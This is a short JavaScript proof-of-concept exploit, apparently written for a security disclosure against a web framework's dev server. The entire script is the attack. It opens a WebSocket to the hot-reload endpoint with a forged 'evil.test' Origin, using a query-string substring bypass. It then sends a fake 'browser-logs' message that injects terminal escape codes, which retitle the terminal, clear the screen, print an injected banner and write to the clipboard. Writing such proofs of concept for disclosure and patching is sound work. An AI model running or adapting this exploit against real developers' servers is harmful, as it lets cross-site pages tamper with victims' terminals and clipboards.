// Cross-site: send a forged 'browser-logs' HMR message over a WebSocket opened
// via the isInternalEndpoint substring bypass (Origin: http://evil.test).
// The server must treat this exactly like a legitimate dev-overlay client.
const WebSocket = require('ws');

const ESC = '\x1b';
const injected =
  ESC + ']0;PWNED-BY-CROSS-SITE-PAGE' + '\x07' +  // OSC 0: set terminal title
  ESC + '[2J' + ESC + '[H' +                       // clear screen + home cursor
  '*** THIS LINE WAS INJECTED BY attacker.test VIA A FORGED HMR MESSAGE ***\n' +
  ESC + ']52;c;' + Buffer.from('pwned-clipboard-write').toString('base64') + '\x07'; // OSC 52: clipboard write

const payload = {
  event: 'browser-logs',
  router: 'app',
  sourceType: 'server',
  entries: [
    {
      kind: 'console',
      method: 'log',
      consoleMethodStack: null,
      args: [
        {
          kind: 'arg',
          // JSON-encoded string, as the real client would send (deserializeArgData does JSON.parse).
          data: JSON.stringify(injected),
        },
      ],
    },
  ],
};

const ws = new WebSocket('ws://localhost:3020/_next/hmr?x=/_next/image', {
  headers: { Origin: 'http://evil.test' },
});
ws.on('open', () => {
  console.log('[+] WS upgrade accepted with hostile Origin (bypass confirmed)');
  ws.send(JSON.stringify(payload));
  setTimeout(() => { ws.close(); process.exit(0); }, 1500);
});
ws.on('error', (e) => { console.log('[-] error:', e.message); process.exit(1); });
ws.on('unexpected-response', (_, r) => { console.log('[-] HTTP', r.statusCode); process.exit(1); });
